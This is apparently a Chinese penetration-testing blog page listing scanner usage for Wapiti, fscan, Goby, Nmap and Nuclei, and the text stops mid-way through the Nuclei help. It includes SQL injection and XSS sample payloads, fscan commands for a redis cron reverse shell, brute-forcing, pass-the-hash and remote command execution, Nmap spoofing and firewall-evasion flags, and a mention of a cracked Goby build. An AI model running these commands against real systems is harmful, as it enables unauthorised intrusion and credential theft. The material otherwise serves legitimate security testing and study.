-    <content><![CDATA[<h1 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h1><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><h2 id="Wapiti"><a href="#Wapiti" class="headerlink" title="Wapiti"></a>Wapiti</h2><p>一个强大的自动化漏洞扫描工具</p>
-<h3 id="一，安装"><a href="#一，安装" class="headerlink" title="一，安装"></a>一，安装</h3><h4 id="kali自带"><a href="#kali自带" class="headerlink" title="kali自带"></a>kali自带</h4><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用Python安装</span><br><span class="line">pip install wapiti3</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础扫描（最常用）</span><br><span class="line">wapiti -u http://target.com</span><br><span class="line"></span><br><span class="line"># 扫描并保存报告</span><br><span class="line">wapiti -u http://target.com -o scan_report</span><br><span class="line"></span><br><span class="line"># 查看报告（扫描完成后）</span><br><span class="line">firefox scan_report/index.html</span><br></pre></td></tr></table></figure>
-<h3 id="二，参数说明"><a href="#二，参数说明" class="headerlink" title="二，参数说明"></a>二，参数说明</h3><table>
-<thead>
-<tr>
-<th align="left">参数</th>
-<th align="left">说明</th>
-<th align="left">示例</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left"><code>-u</code></td>
-<td align="left">目标URL</td>
-<td align="left"><code>wapiti -u http://target.com</code></td>
-</tr>
-<tr>
-<td align="left"><code>-o</code></td>
-<td align="left">输出目录</td>
-<td align="left"><code>-o ./reports</code></td>
-</tr>
-<tr>
-<td align="left"><code>-f</code></td>
-<td align="left">报告格式</td>
-<td align="left"><code>-f html</code></td>
-</tr>
-<tr>
-<td align="left"><code>-m</code></td>
-<td align="left">扫描模块</td>
-<td align="left"><code>-m &quot;sql,xss&quot;</code></td>
-</tr>
-<tr>
-<td align="left"><code>-x</code></td>
-<td align="left">排除模块</td>
-<td align="left"><code>-x &quot;sql&quot;</code></td>
-</tr>
-<tr>
-<td align="left"><code>-c</code></td>
-<td align="left">配置文件</td>
-<td align="left"><code>-c config.json</code></td>
-</tr>
-<tr>
-<td align="left"><code>-p</code></td>
-<td align="left">代理设置</td>
-<td align="left"><code>-p http://proxy:8080</code></td>
-</tr>
-<tr>
-<td align="left"><code>-t</code></td>
-<td align="left">超时时间</td>
-<td align="left"><code>-t 10</code></td>
-</tr>
-<tr>
-<td align="left"><code>-d</code></td>
-<td align="left">扫描深度</td>
-<td align="left"><code>-d 3</code></td>
-</tr>
-</tbody></table>
-<h3 id="三、基础使用教程"><a href="#三、基础使用教程" class="headerlink" title="三、基础使用教程"></a>三、基础使用教程</h3><h4 id="3-1-最简单的扫描命令"><a href="#3-1-最简单的扫描命令" class="headerlink" title="3.1 最简单的扫描命令"></a>3.1 最简单的扫描命令</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 基础扫描（最常用）</span><br><span class="line">wapiti -u http://target.com</span><br><span class="line"></span><br><span class="line"># 扫描并保存报告</span><br><span class="line">wapiti -u http://target.com -o scan_report</span><br><span class="line"></span><br><span class="line"># 查看报告（扫描完成后）</span><br><span class="line">firefox scan_report/index.html</span><br></pre></td></tr></table></figure>
-
-<h3 id="四、实战扫描步骤"><a href="#四、实战扫描步骤" class="headerlink" title="四、实战扫描步骤"></a>四、实战扫描步骤</h3><h4 id="4-1-第一步：快速漏洞扫描"><a href="#4-1-第一步：快速漏洞扫描" class="headerlink" title="4.1 第一步：快速漏洞扫描"></a>4.1 第一步：快速漏洞扫描</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 完整漏洞扫描（默认所有模块）</span><br><span class="line">wapiti -u http://target.com -o target_scan</span><br><span class="line"></span><br><span class="line"># 扫描完成后查看报告</span><br><span class="line">ls target_scan/</span><br><span class="line"># 会生成index.html、report.html等文件</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="4-2-第二步：选择性漏洞扫描"><a href="#4-2-第二步：选择性漏洞扫描" class="headerlink" title="4.2 第二步：选择性漏洞扫描"></a>4.2 第二步：选择性漏洞扫描</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只扫描SQL注入和XSS漏洞</span><br><span class="line">wapiti -u http://target.com -m &quot;sql,xss&quot; -o quick_scan</span><br><span class="line"></span><br><span class="line"># 排除特定漏洞类型</span><br><span class="line">wapiti -u http://target.com -x &quot;sql,backup&quot; -o clean_scan</span><br><span class="line"></span><br><span class="line"># 常用模块列表</span><br><span class="line"># sql - SQL注入</span><br><span class="line"># xss - 跨站脚本</span><br><span class="line"># backup - 备份文件</span><br><span class="line"># exec - 命令执行</span><br><span class="line"># file - 文件包含</span><br><span class="line"># htaccess - .htaccess配置</span><br><span class="line"># wp - WordPress漏洞</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="4-3-第三步：设置扫描深度和范围"><a href="#4-3-第三步：设置扫描深度和范围" class="headerlink" title="4.3 第三步：设置扫描深度和范围"></a>4.3 第三步：设置扫描深度和范围</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 设置扫描深度（默认1）</span><br><span class="line">wapiti -u http://target.com -d 3 -o deep_scan</span><br><span class="line"></span><br><span class="line"># 设置最大扫描页面数</span><br><span class="line">wapiti -u http://target.com --max-scan-per-module 100 -o limited_scan</span><br><span class="line"></span><br><span class="line"># 设置最大链接数</span><br><span class="line">wapiti -u http://target.com --max-links 2000 -o links_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="4-4-第四步：使用代理扫描"><a href="#4-4-第四步：使用代理扫描" class="headerlink" title="4.4 第四步：使用代理扫描"></a>4.4 第四步：使用代理扫描</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用HTTP代理</span><br><span class="line">wapiti -u http://target.com -p http://127.0.0.1:8080 -o proxy_scan</span><br><span class="line"></span><br><span class="line"># 使用SOCKS代理</span><br><span class="line">wapiti -u http://target.com -p socks5://127.0.0.1:1080 -o socks_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="五、高级扫描技巧"><a href="#五、高级扫描技巧" class="headerlink" title="五、高级扫描技巧"></a>五、高级扫描技巧</h3><h4 id="5-1-认证扫描（登录扫描）"><a href="#5-1-认证扫描（登录扫描）" class="headerlink" title="5.1 认证扫描（登录扫描）"></a>5.1 认证扫描（登录扫描）</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：使用表单认证</span><br><span class="line">wapiti -u http://target.com -a login_data.txt -o auth_scan</span><br><span class="line"></span><br><span class="line"># login_data.txt内容示例：</span><br><span class="line"># &#123;&quot;login&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;admin123&quot;, &quot;url&quot;: &quot;http://target.com/login&quot;&#125;</span><br><span class="line"></span><br><span class="line"># 方法2：使用cookies</span><br><span class="line">wapiti -u http://target.com --cookie &quot;session=abc123&quot; -o cookie_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="5-2-自定义payload扫描"><a href="#5-2-自定义payload扫描" class="headerlink" title="5.2 自定义payload扫描"></a>5.2 自定义payload扫描</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用自定义payload文件</span><br><span class="line">wapiti -u http://target.com --payload /path/to/payloads.json -o custom_scan</span><br><span class="line"></span><br><span class="line"># payload文件示例格式</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sql&quot;: [</span><br><span class="line">    &quot;&#x27; OR &#x27;1&#x27;=&#x27;1&quot;,</span><br><span class="line">    &quot;&#x27;; DROP TABLE users;--&quot;</span><br><span class="line">  ],</span><br><span class="line">  &quot;xss&quot;: [</span><br><span class="line">    &quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;,</span><br><span class="line">    &quot;&lt;img src=x onerror=alert(1)&gt;&quot;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="5-3-批量扫描多个目标"><a href="#5-3-批量扫描多个目标" class="headerlink" title="5.3 批量扫描多个目标"></a>5.3 批量扫描多个目标</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 方法1：使用文本文件</span><br><span class="line"># targets.txt内容：</span><br><span class="line"># http://target1.com</span><br><span class="line"># http://target2.com</span><br><span class="line"></span><br><span class="line">wapiti -l targets.txt -o batch_scan</span><br><span class="line"></span><br><span class="line"># 方法2：扫描子域名</span><br><span class="line">wapiti -u http://target.com --scope folder -o folder_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="5-4-设置请求头"><a href="#5-4-设置请求头" class="headerlink" title="5.4 设置请求头"></a>5.4 设置请求头</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 自定义User-Agent</span><br><span class="line">wapiti -u http://target.com -H &quot;User-Agent: Mozilla/5.0&quot; -o header_scan</span><br><span class="line"></span><br><span class="line"># 添加多个请求头</span><br><span class="line">wapiti -u http://target.com --headers headers.txt -o multi_header_scan</span><br><span class="line"></span><br><span class="line"># headers.txt内容：</span><br><span class="line"># User-Agent: Mozilla/5.0</span><br><span class="line"># X-Forwarded-For: 127.0.0.1</span><br><span class="line"># Authorization: Bearer token123</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="六、报告生成与分析"><a href="#六、报告生成与分析" class="headerlink" title="六、报告生成与分析"></a>六、报告生成与分析</h3><h4 id="6-1-生成不同格式的报告"><a href="#6-1-生成不同格式的报告" class="headerlink" title="6.1 生成不同格式的报告"></a>6.1 生成不同格式的报告</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># HTML报告（默认）</span><br><span class="line">wapiti -u http://target.com -f html -o html_report</span><br><span class="line"></span><br><span class="line"># JSON报告</span><br><span class="line">wapiti -u http://target.com -f json -o json_report</span><br><span class="line"></span><br><span class="line"># TXT报告</span><br><span class="line">wapiti -u http://target.com -f txt -o txt_report</span><br><span class="line"></span><br><span class="line"># XML报告</span><br><span class="line">wapiti -u http://target.com -f xml -o xml_report</span><br><span class="line"></span><br><span class="line"># 同时生成多种格式</span><br><span class="line">wapiti -u http://target.com -f &quot;html,json&quot; -o multi_report</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="6-2-报告内容解读"><a href="#6-2-报告内容解读" class="headerlink" title="6.2 报告内容解读"></a>6.2 报告内容解读</h4><p>text</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">生成的报告包含：</span><br><span class="line">1. 漏洞摘要（按严重程度分类）</span><br><span class="line">2. 漏洞详情（每个漏洞的描述）</span><br><span class="line">3. 受影响的URL和参数</span><br><span class="line">4. 攻击载荷（payload）</span><br><span class="line">5. HTTP请求/响应示例</span><br><span class="line">6. 修复建议</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="6-3-快速查看扫描结果"><a href="#6-3-快速查看扫描结果" class="headerlink" title="6.3 快速查看扫描结果"></a>6.3 快速查看扫描结果</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 查看扫描状态</span><br><span class="line">cat scan_report/.history</span><br><span class="line"></span><br><span class="line"># 查看发现的漏洞数量</span><br><span class="line">grep -c &quot;vulnerability&quot; scan_report/report.html</span><br><span class="line"></span><br><span class="line"># 提取高风险漏洞</span><br><span class="line">grep -A5 &quot;High&quot; scan_report/report.html</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="七、常用扫描模板"><a href="#七、常用扫描模板" class="headerlink" title="七、常用扫描模板"></a>七、常用扫描模板</h3><h4 id="7-1-快速安全检测"><a href="#7-1-快速安全检测" class="headerlink" title="7.1 快速安全检测"></a>7.1 快速安全检测</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只检测常见高危漏洞</span><br><span class="line">wapiti -u http://target.com -m &quot;sql,xss,exec,file&quot; -o quick_check</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="7-2-全面漏洞扫描"><a href="#7-2-全面漏洞扫描" class="headerlink" title="7.2 全面漏洞扫描"></a>7.2 全面漏洞扫描</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 使用所有模块（默认）</span><br><span class="line">wapiti -u http://target.com -o full_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="7-3-WordPress网站扫描"><a href="#7-3-WordPress网站扫描" class="headerlink" title="7.3 WordPress网站扫描"></a>7.3 WordPress网站扫描</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># WordPress专用扫描</span><br><span class="line">wapiti -u http://target.com -m &quot;wp&quot; -o wp_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="7-4-API接口扫描"><a href="#7-4-API接口扫描" class="headerlink" title="7.4 API接口扫描"></a>7.4 API接口扫描</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 针对REST API的扫描</span><br><span class="line">wapiti -u http://target.com/api -m &quot;sql,xss,exec&quot; --scope folder -o api_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="八、实战示例"><a href="#八、实战示例" class="headerlink" title="八、实战示例"></a>八、实战示例</h3><h4 id="示例1：扫描测试网站DVWA"><a href="#示例1：扫描测试网站DVWA" class="headerlink" title="示例1：扫描测试网站DVWA"></a>示例1：扫描测试网站DVWA</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 扫描DVWA（需先启动DVWA服务）</span><br><span class="line">wapiti -u http://localhost/dvwa -o dvwa_scan</span><br><span class="line"></span><br><span class="line"># 使用认证扫描DVWA</span><br><span class="line">wapiti -u http://localhost/dvwa \</span><br><span class="line">  -a &#x27;&#123;&quot;login&quot;: &quot;admin&quot;, &quot;password&quot;: &quot;password&quot;, &quot;url&quot;: &quot;http://localhost/dvwa/login.php&quot;&#125;&#x27; \</span><br><span class="line">  -o dvwa_auth_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="示例2：扫描包含登录的Web应用"><a href="#示例2：扫描包含登录的Web应用" class="headerlink" title="示例2：扫描包含登录的Web应用"></a>示例2：扫描包含登录的Web应用</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 步骤1：首先正常扫描</span><br><span class="line">wapiti -u http://target.com -o initial_scan</span><br><span class="line"></span><br><span class="line"># 步骤2：如果发现登录页面，使用认证扫描</span><br><span class="line">wapiti -u http://target.com \</span><br><span class="line">  --cookie &quot;sessionid=abc123def456&quot; \</span><br><span class="line">  -o authenticated_scan</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="示例3：限制扫描范围（避免误操作）"><a href="#示例3：限制扫描范围（避免误操作）" class="headerlink" title="示例3：限制扫描范围（避免误操作）"></a>示例3：限制扫描范围（避免误操作）</h4><p>bash</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 只扫描指定目录</span><br><span class="line">wapiti -u http://target.com/admin --scope folder -o admin_scan</span><br><span class="line"></span><br><span class="line"># 排除某些路径</span><br><span class="line">wapiti -u http://target.com --exclude &quot;logout,delete&quot; -o safe_scan</span><br></pre></td></tr></table></figure>
-
-<h2 id="DudeSuite"><a href="#DudeSuite" class="headerlink" title="DudeSuite"></a>DudeSuite</h2><p>一款渗透测试工具集</p>
-<p>集成请求重放、漏洞验证、端口扫描、密码爆破、shell管理、fofa、编解码等实用工具</p>
-<p><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2FYLKhV1zm0uiczV2K03vH%2Fimage.png?alt=media&#x26;token=f8449b07-df7f-4331-bf10-e717674701b1" alt="img"></p>
-<h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>一款内网综合扫描工具，方便一键自动化、全方位漏扫扫描。 支持主机存活探测、端口扫描、常见服务的爆破、ms17010、redis批量写公钥、计划任务反弹shell、读取win网卡信息、web指纹识别、web漏洞扫描、netbios探测、域控识别等功能。</p>
-<p>简单用法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24  (默认使用全部模块)</span><br><span class="line">fscan.exe -h 192.168.1.1/16  (B段扫描)</span><br></pre></td></tr></table></figure>
-
-<p>其他用法</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">fscan.exe -h 192.168.1.1/24 -np -no -nopoc(跳过存活检测 、不保存文件、跳过web poc扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rf id_rsa.pub (redis 写公钥)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -rs 192.168.1.1:6666 (redis 计划任务反弹shell)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -c whoami (ssh 爆破成功后，命令执行)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ssh -p 2222 (指定模块ssh和端口)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pwdf pwd.txt -userf users.txt (加载指定文件的用户名、密码来进行爆破)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -o /tmp/1.txt (指定扫描结果保存路径,默认保存在当前路径) </span><br><span class="line">fscan.exe -h 192.168.1.1/8  (A段的192.x.x.1和192.x.x.254,方便快速查看网段信息 )</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb -pwd password (smb密码碰撞)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 (指定模块)</span><br><span class="line">fscan.exe -hf ip.txt  (以文件导入)</span><br><span class="line">fscan.exe -u http://baidu.com -proxy 8080 (扫描单个url,并设置http代理 http://127.0.0.1:8080)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -nobr -nopoc (不进行爆破,不扫Web poc,以减少流量)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -pa 3389 (在原基础上,加入3389-&gt;rdp扫描)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -socks5 127.0.0.1:1080 (只支持简单tcp功能的代理,部分功能的库不支持设置代理)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m ms17010 -sc add (内置添加用户等功能,只适用于备选工具,更推荐其他ms17010的专项利用工具)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m smb2 -user admin -hash xxxxx (pth hash碰撞,xxxx:ntlmhash,如32ed87bdb5fdc5e9cba88547376818d4)</span><br><span class="line">fscan.exe -h 192.168.1.1/24 -m wmiexec -user admin -pwd password -c xxxxx (wmiexec无回显命令执行)</span><br></pre></td></tr></table></figure>
-
-<h2 id="Goby"><a href="#Goby" class="headerlink" title="Goby"></a>Goby</h2><p>红队破解版，有很多公开的红队POC可以自行集成</p>
-<figure><img src="https://2843206953-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2FuQdEIFRPpmirHXN97b5y%2Fuploads%2F1bUaoUgpw5a1AB77HitB%2Fimage.png?alt=media&#x26;token=53e026fb-a512-4033-9cb6-4a36e0f2d9cd" alt=""><figcaption></figcaption></figure>
-
-<h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><p>1. nmap -sT 192.168.96.4  &#x2F;&#x2F;TCP连接扫描，不安全，慢</p>
-<p>2. nmap -sS 192.168.96.4  &#x2F;&#x2F;SYN扫描,使用最频繁，安全，快</p>
-<p>3. nmap -Pn 192.168.96.4  &#x2F;&#x2F;目标机禁用ping，绕过ping扫描</p>
-<p>4. nmap -sU 192.168.96.4  &#x2F;&#x2F;<a href="https://so.csdn.net/so/search?q=UDP&spm=1001.2101.3001.7020">UDP</a>扫描,慢,可得到有价值的服务器程序</p>
-<p>5. nmap -sI 僵尸ip 目标ip  &#x2F;&#x2F;使用僵尸机对目标机发送数据包</p>
-<p>6. nmap -sA 192.168.96.4  &#x2F;&#x2F;检测哪些端口被屏蔽</p>
-<p>7. nmap 192.168.96.4 -p &lt;portnumber&gt;  &#x2F;&#x2F;对指定端口扫描</p>
-<p>8. nmap 192.168.96.1&#x2F;24 &#x2F;&#x2F;对整个网段的主机进行扫描</p>
-<p>9. nmap 192.168.96.4 -oX myscan.xml &#x2F;&#x2F;对扫描结果另存在myscan.xml</p>
-<p>10. nmap -T1~6 192.168.96.4  &#x2F;&#x2F;设置扫描速度，一般T4足够。</p>
-<p>11. nmap -sV 192.168.96.4  &#x2F;&#x2F;对端口上的服务程序版本进行扫描</p>
-<p>12. nmap -O 192.168.96.4  &#x2F;&#x2F;对目标主机的操作系统进行扫描</p>
-<p>13. nmap -sC &lt;scirptfile&gt; 192.168.96.4  &#x2F;&#x2F;使用脚本进行扫描，耗时长</p>
-<p>14. nmap -A 192.168.96.4  &#x2F;&#x2F;强力扫描，耗时长</p>
-<p>15. nmap -6 ipv6地址   &#x2F;&#x2F;对ipv6地址的主机进行扫描</p>
-<p>16. nmap -f 192.168.96.4  &#x2F;&#x2F;使用小数据包发送，避免被识别出</p>
-<p>17. nmap –mtu &lt;size&gt; 192.168.96.4 &#x2F;&#x2F;发送的包大小,最大传输单元必须是8的整数</p>
-<p>18. nmap -D &lt;假ip&gt; 192.168.96.4 &#x2F;&#x2F;发送参杂着假ip的数据包检测</p>
-<p>19. nmap –source-port &lt;portnumber&gt; &#x2F;&#x2F;针对防火墙只允许的源端口</p>
-<p>20. nmap –data-length: &lt;length&gt; 192.168.96.4 &#x2F;&#x2F;改变发生数据包的默认的长度，避免被识别出来是nmap发送的。</p>
-<p>21. nmap -v 192.168.96.4  &#x2F;&#x2F;显示冗余信息(扫描细节)</p>
-<p>22. nmap -sn 192.168.96.4  &#x2F;&#x2F;对目标进行ping检测，不进行端口扫描（会发送四种报文确定目标是否存活,）</p>
-<p>23. nmap -sP 192.168.96.4  &#x2F;&#x2F;仅仅对目标进行ping检测。</p>
-<p>24. nmap -n&#x2F;-p 192.168.96.4  &#x2F;&#x2F;-n表示不进行dns解析，-p表示要</p>
-<p>25. nmap –system-dns 192.168.96.4  &#x2F;&#x2F;扫描指定系统的dns服务器</p>
-<p>26. nmap –traceroute 192.168.96.4  &#x2F;&#x2F;追踪每个路由节点。</p>
-<p>27. nmap -PE&#x2F;PP&#x2F;PM: 使用ICMP echo, timestamp, and netmask 请求包发现主机。</p>
-<p>28. nmap -sP 192.168.96.4       &#x2F;&#x2F;主机存活性扫描，arp直连方式。</p>
-<p>29. nmap -iR [number]       &#x2F;&#x2F;对随机生成number个地址进行扫描。</p>
-<h3 id="防火墙-x2F-IDS逃逸-amp-x20"><a href="#防火墙-x2F-IDS逃逸-amp-x20" class="headerlink" title="防火墙&#x2F;IDS逃逸&amp;#x20;"></a>防火墙&#x2F;IDS逃逸&amp;#x20;</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -f --mtu=16 192.168.0.8</span><br><span class="line">#报文分段，mtu必须是8的倍数</span><br><span class="line"></span><br><span class="line">nmap -sI www.0day.com:80 192.168.0.8	</span><br><span class="line">#源IP欺骗</span><br><span class="line"></span><br><span class="line">nmap --source-port 53 192.168.0.8		</span><br><span class="line">#源端口欺骗</span><br><span class="line">#防火墙对服务器的设置会根据端口选择是否信任数据流</span><br><span class="line">#管理员可能会认为这些端口不会有攻击发生，所以可以利用这些端口扫描</span><br><span class="line"></span><br><span class="line">nmap --data-length 30 192.168.0.8</span><br><span class="line">#在原来报文基础上，附加随机数据，达到规避防火墙的效果</span><br><span class="line"></span><br><span class="line">nmap --spoof-mac 0 192.168.0.8</span><br><span class="line">#指定一个随机的MAC地址</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h3 id="返回说明"><a href="#返回说明" class="headerlink" title="返回说明"></a>返回说明</h3><h4 id="端口状态说明"><a href="#端口状态说明" class="headerlink" title="端口状态说明"></a>端口状态说明</h4><p><strong>open(开放的)</strong></p>
-<p>应用程序正在该端口接收TCP 连接或者UDP报文。</p>
-<p><strong>closed(关闭的)</strong></p>
-<p>关闭的端口对于Nmap也是可访问的(它接受Nmap的探测报文并作出响应)， 但没有应用程序在其上监听。</p>
-<p><strong>filtered(被过滤的)</strong></p>
-<p>由于包过滤阻止探测报文到达端口， Nmap无法确定该端口是否开放。</p>
-<p>过滤可能来自专业的防火墙设备，路由器规则 或者主机上的软件防火墙。</p>
-<p><strong>unfiltered(未被过滤的)</strong></p>
-<p>未被过滤状态意味着端口可访问，但Nmap不能确定它是开放还是关闭。</p>
-<p>只有用于映射防火墙规则集的ACK扫描才会把端口分类到这种状态。</p>
-<p>用其它类型的扫描如窗口扫描，SYN扫描，或者FIN扫描来扫描未被过滤的端口可以帮助确定 端口是否开放。</p>
-<p><strong>open|filtered(开放或者被过滤的)</strong></p>
-<p>当无法确定端口是开放还是被过滤的，Nmap就把该端口划分成 这种状态。</p>
-<p>开放的端口不响应就是一个例子。没有响应也可能意味着报文过滤器丢弃 了探测报文或者它引发的任何响应。</p>
-<p>因此Nmap无法确定该端口是开放的还是被过滤的。 UDP，IP协议， FIN，Null，和Xmas扫描可能把端口归入此类。</p>
-<p><strong>closed|filtered(关闭或者被过滤的)</strong></p>
-<p>该状态用于Nmap不能确定端口是关闭的还是被过滤的。 它只可能出现在IPID Idle扫描中。</p>
-<h4 id="端口扫描技术"><a href="#端口扫描技术" class="headerlink" title="端口扫描技术"></a>端口扫描技术</h4><p><strong>TCP连接扫描</strong></p>
-<p>使用操作系统的网络连接系统调用 connect()，对目标主机发起 TCP 三路握手，待完成后 Nmap 立即中断此次连接。</p>
-<p>Nmap 通过获取每个尝试连接的状态信息来判定侦测端口的状态</p>
-<p><strong>SYN扫描</strong></p>
-<p>Nmap 产生一个 SYN 数据报文，如果侦测端口开放并返回 SYN-ACK 响应报文</p>
-<p>Nmap 据此发送 RST 报文给侦测端口结束当前连接，这样做的好处在于缩短了端口扫描时间</p>
-<p><strong>UDP扫描</strong></p>
-<p>UDP 本身是无连接的协议，Nmap 向目标主机的端口发送 UDP 探测报文</p>
-<p>如果端口没有开放，被侦测主机将会发送一个 ICMP 端口不可到达的消息</p>
-<p>Nmap 根据这个消息确定端口闭合（closed）或者被过滤 (unfiltered)</p>
-<p>通常没有回复意味着端口是开放（open）状态 。</p>
-<p><strong>ACK扫描</strong></p>
-<p>这种扫描比较特殊，它不能确切知道端口的基本状态，而是主要用来探测防火墙是否存在以及其中设定的过滤规则</p>
-<p><strong>FIN扫描</strong></p>
-<p>和 SYN 扫描相比，这种方式更为隐蔽，因此能够穿过防火墙的过滤</p>
-<p>关闭（closed）端口将会返回合适的 RST 报文，而开放端口将忽略这样的侦测报文</p>
-<p>具备类似防火墙不敏感特性的还有 -sN NULL 扫描，-sX X-mas 扫描。</p>
-<h2 id="Nuclei"><a href="#Nuclei" class="headerlink" title="Nuclei"></a>Nuclei</h2><p>Nuclei是一个基于模板的、可配置攻击目标的扫描快速工具，同时还提供了强大的可扩展性和易用性。</p>
-<h3 id="常用命令-1"><a href="#常用命令-1" class="headerlink" title="常用命令"></a>常用命令</h3><p>-c 并发请求数（默认10）nuclei -c 100</p>
-<p>-timeout 超时时间(默认为5秒) nuclei -timeout 5&amp;#x20;</p>
-<p>-proxy-url 输入代理地址 nuclei -proxy-url hxxp:&#x2F;&#x2F;127.0.0.1:8080&amp;#x20;</p>
-<p>-proxy-socks-url 输入socks代理地址 nuclei -proxy-socks-url socks5:&#x2F;&#x2F;user:pass@Your IP:1080&amp;#x20;</p>
-<p>-random-agent 使用随机的UA nuclei -random-agent&amp;#x20;</p>
-<p>-H 自定义请求头 nuclei -H “x-bug-bounty:hacker”&amp;#x20;</p>
-<p>-update-templates 下载或者升级模板  nuclei -update-templates&amp;#x20;</p>
-<p>nuclei -t test.yaml –validate 验证模板格式</p>
-<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a>  指定模板和目标</p>
-<p>nuclei -t test.yaml -l target.txt  批量扫描</p>
-<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a> -p socks5:&#x2F;&#x2F;127.0.0.1:7890 指定代理</p>
-<p>nuclei -t test.yaml -l target.txt -stats Debug  查看扫描进度</p>
-<p>nuclei -t test.yaml -u <a href="http://exam.com/">http://exam.com</a> -debug查看发送数据包和返回包</p>
-<h3 id="全部参数"><a href="#全部参数" class="headerlink" title="全部参数"></a>全部参数</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># nuclei -h</span><br><span class="line"></span><br><span class="line">用法：</span><br><span class="line">  nuclei [命令]</span><br><span class="line"></span><br><span class="line">命令：</span><br><span class="line">目标：</span><br><span class="line">   -u, -target string[]                 指定扫描的URL/主机</span><br><span class="line">   -l, -list string                     指定需要扫描的URL/主机文件（一行一个）</span><br><span class="line"></span><br><span class="line">模板：</span><br><span class="line">   -t, -templates string[]              指定需要扫描的模板或者模板的路径</span><br><span class="line">   -nt, -new-templates                  只扫描最新版本中添加的模板</span><br><span class="line">   -w, -workflows string[]              指定扫描中的工作流或者工作流目录</span><br><span class="line">   -validate                            验证通过的模板</span><br><span class="line">   -tl                                  列出所有可用的模板</span><br><span class="line"></span><br><span class="line">过滤：</span><br><span class="line">   -tags string[]                       执行有标记的模板子集</span><br><span class="line">   -etags, -exclude-tags string[]       执行标记为排除的模板</span><br><span class="line">   -itags, -include-tags string[]       不执行具有攻击性的模板</span><br><span class="line">   -et, 